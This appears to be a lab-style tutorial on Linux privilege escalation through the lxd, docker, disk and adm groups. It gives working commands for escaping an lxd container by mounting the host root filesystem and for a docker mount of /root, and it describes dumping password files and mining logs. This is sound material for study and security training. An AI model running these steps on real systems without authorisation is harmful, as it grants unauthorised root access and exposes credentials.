## <span style="color:#8BE9FD">What Are Privileged Groups?</span>

In Linux, some **groups** have **extra powers**.
If your user is part of one of these special groups, you might be able to:

✅ Read sensitive files  
✅ Run commands as **root**  
✅ Access or change important system data

These groups include:

- `lxd`   : Create containers with root access to the host
- `docker` : Run containers and mount host folders (full access)
- `disk` : Access system disks, bypass everything
- `adm` : Read log files (can leak sensitive info)

Let’s look at what each one means and how it can help you **escalate privileges** (become root).

## <span style="color:#8BE9FD">What is LXD / LXC?</span>

- **LXC (Linux Containers)** and **LXD (Linux Daemon)** are tools that let you create **lightweight virtual environments** called **containers**.
- Containers are **isolated** from the rest of the system, but they **share the same Linux kernel**.
- Think of it like running a mini Linux system inside a real one – like opening a new computer inside your current computer.

## <span style="color:#8BE9FD">🧠 Why This Matters for Privilege Escalation?</span>

If your user is part of the **`lxd` group**, it means you can manage and create these containers.  
But here's the trick:

> You can make a special container that has access to the **host system’s files as root**, allowing you to **escape the container and become root** on the host!

1. Run the `id` command and make sure you're in the `lxd` group first:
2. Import the Alpine image (you can download it from the internet; for now we already have it on the target system): `alpine-v3.18-x86_64-20230607_1234.tar.gz`
   
```bash
lxc image import alpine-v3.18-x86_64-20230607_1234.tar.gz --alias alpescape
```
   
3. Confirm it was imported
```bash
lxc image list
```
   
   You should see a line for `alpescape`.
   
4. Create a **privileged container** from the image
```bash
lxc init alpescape privesc -c security.privileged=true
```
   This creates a new container called `privesc` with **privileged access** (important!).
   
5. Mount the host root `/` inside the container
```bash
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
   This lets the container access the host's full file system at `/mnt/root`.
   
6. Start the container
   ```bash
lxc start privesc
```
   
7. Get a shell inside the container
```bash
lxc exec privesc /bin/sh
```
_(Alpine uses `/bin/sh` instead of `/bin/bash`)_

8. Access the host system's root directory
```bash
ls /mnt/root
cd /mnt/root/root
cat flag.txt
```

## <span style="color:#8BE9FD">🐳 Docker Group – Almost Root Access</span>

If you're in the `docker` group:

- You can start a Docker container and **mount the host's folders** inside it.
Example:
```bash
docker run -v /root:/mnt -it ubuntu
```

This command:
- Creates a new container
- Mounts the host’s `/root` folder
- Lets you browse `/mnt` from inside the container and access `/root` on the host

➡️ You can grab root's SSH keys or edit critical files.

## <span style="color:#8BE9FD">💽 Disk Group – Direct Access to Disks</span>

If you're in the `disk` group:

- You can access **raw disks** like `/dev/sda1`
- You can use tools like `debugfs` to:
    - Read or write any file
    - Dump password files
    - Add users


➡️ This group is dangerous. Total system access.
---
## <span style="color:#8BE9FD">📜 ADM Group – Read System Logs</span>

If you're in the `adm` group:

- You can read log files in `/var/log`
- Example:
```bash
cat /var/log/auth.log
```

While this doesn’t give direct root access, you can:

- Find passwords in logs
- See who is logging in
- Spot cron jobs or scripts running as root

➡️ It's useful for **gathering info** that may help you **escalate later**.
